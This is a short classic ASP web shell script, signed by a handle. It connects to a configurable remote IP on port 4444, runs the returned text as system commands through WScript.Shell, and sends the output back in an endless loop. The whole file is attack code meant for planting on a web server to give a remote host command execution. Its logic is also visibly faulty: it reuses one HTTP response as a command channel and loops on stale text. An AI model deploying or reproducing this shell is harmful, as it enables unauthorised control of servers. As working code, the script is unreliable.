' written by: 𐊖𝖺𝔪𝖺𝖾ɭ

<%
    ' Define the target IP address and port
    Dim targetIP, targetPort
    targetIP = ""  ' ip
    targetPort = 4444

    ' Create a TCP/IP socket
    Dim socket
    Set socket = CreateObject("MSXML2.ServerXMLHTTP.6.0")

    ' Establish a connection to the target IP and port
    socket.Open "GET", "http://" & targetIP & ":" & targetPort, False
    socket.Send

    ' Read the response from the target
    Dim response
    response = socket.responseText

    ' Output the response to the browser
    Response.Write(response)

    ' Function to execute commands
    Sub ExecuteCommand(command)
        Dim shell, output
        Set shell = CreateObject("WScript.Shell")
        output = shell.Exec(command).StdOut.ReadAll()
        socket.Send output
        Set shell = Nothing
    End Sub

    ' Main loop to receive and execute commands
    Do While True
        Dim command
        command = socket.responseText
        If command <> "" Then
            ExecuteCommand(command)
        End If
    Loop

    ' Clean up
    Set socket = Nothing
%>